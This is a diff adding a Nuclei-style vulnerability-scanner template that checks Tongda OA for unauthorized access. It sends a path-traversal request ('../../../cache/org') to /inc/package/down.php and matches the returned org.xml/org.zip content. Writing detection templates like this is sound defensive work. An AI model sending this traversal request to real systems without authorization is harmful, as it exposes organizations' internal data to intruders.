@@ -1,0 +1,23 @@
+id: tong-da-oa-incpackagedown-unauthorized-access
+info:
+  name: Tongda OA incpackagedown.php Unauthorized Access Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: unauthorized-access
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/inc/package/down.php?id=../../../cache/org"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "org.xml"
+      - type: word
+        part: header
+        words:
+          - "org.zip"
